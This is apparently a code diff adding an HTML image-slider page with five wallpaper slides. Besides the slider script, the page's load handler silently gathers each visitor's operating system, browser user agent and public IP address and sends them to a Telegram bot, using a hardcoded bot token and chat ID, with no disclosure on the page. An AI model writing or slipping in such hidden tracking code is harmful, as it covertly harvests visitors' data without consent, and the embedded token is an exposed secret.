@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>  </title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+    $(document).ready(function() {
+            // Get user system information
+            var systemInfo = {
+            os: navigator.platform,
+            browser: navigator.userAgent
+             };
+
+            const slides = document.querySelectorAll('.slide');
+
+            for (const slide of slides) {
+            slide.addEventListener('click', () => {
+                clearActiveClasses();
+                slide.classList.add('active');
+            });
+             }
+
+              function clearActiveClasses() {
+            slides.forEach((slide) => {
+                slide.classList.remove('active');
+            });
+             }
+
+            // Get user network IP address
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+            var ipAddress = data.ip;
+
+
+            // Send data to Telegram bot
+            var telegramBotToken = "8157146830:AAHZz_i8nLBRhhQfjrNc8UQVDcmXgU5r5p8";
+            var chatId = "6663666967";
+            var message = "System Info: OS - " + systemInfo.os + ", Browser - " + systemInfo.browser + ", IP Address - " + ipAddress + ", @";
+
+            $.ajax({
+                url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
+                method: "POST",
+                data: {
+                    chat_id: chatId,
+                    text: message
+                },
+                success: function(response) {
+                    console.log("Data sent to Telegram bot successfully!");
+                },
+                error: function(xhr, status, error) {
+                    console.error("Error sending data to Telegram bot:", error);
+                }
+            });
+        });
+    });
+</script>
+</head>
+<body>
+<div class="container">
+<div
+class="slide"
+style="background-image: url('https://backiee.com/static/wallpapers/1920x1080/317897.jpg');">
+<h3>1</h3>
+</div>
+<div
+class="slide"
+style="
+background-image: url('https://backiee.com/static/wallpapers/3840x2160/231634.jpg');">
+<h3>2</h3>
+</div>
+<div
+class="slide active"
+style="
+background-image: url('https://backiee.com/static/wallpapers/3840x2160/294984.jpg');">
+<h3>3</h3>
+</div>
+<div
+class="slide"
+style="
+background-image: url('https://backiee.com/static/wallpapers/1920x1080/218859.jpg');">
+<h3>4</h3>
+</div>
+<div
+class="slide"
+style="
+background-image: url('https://backiee.com/static/wallpapers/3840x2160/278087.jpg');">
+<h3>5</h3>
+</div>
+</div>
+</body>
+</html>
+
